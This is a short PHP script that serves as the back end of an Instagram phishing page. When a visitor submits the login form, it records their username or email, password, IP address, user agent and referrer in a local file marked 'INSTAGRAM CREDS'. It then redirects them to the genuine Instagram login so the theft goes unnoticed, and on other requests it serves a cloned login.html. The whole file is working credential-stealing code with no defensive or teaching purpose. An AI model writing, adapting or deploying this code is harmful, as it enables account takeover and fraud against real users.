<?php
header('Content-Type: text/html; charset=UTF-8');

// Handle credential capture
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s T');
    $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    
    $data = "\n=== INSTAGRAM CREDS [" . $timestamp . "] ===";
    $data .= "\nIP: $ip";
    $data .= "\nUA: $ua";
    $data .= "\nReferrer: $referrer";
    $data .= "\nUsername/Email: $username";
    $data .= "\nPassword: $password";
    $data .= "\n" . str_repeat("=", 50);
    
    $dir = 'data';
    
    if (!is_dir($dir)) mkdir($dir, 0755, true);
    file_put_contents($dir . '/data.txt', $data, FILE_APPEND | LOCK_EX);
    
    // Redirect to real Instagram
    header('Location: https://www.instagram.com/accounts/login/?next=%2F');
    exit();
}

// Serve HTML page for GET requests
include 'login.html';
?>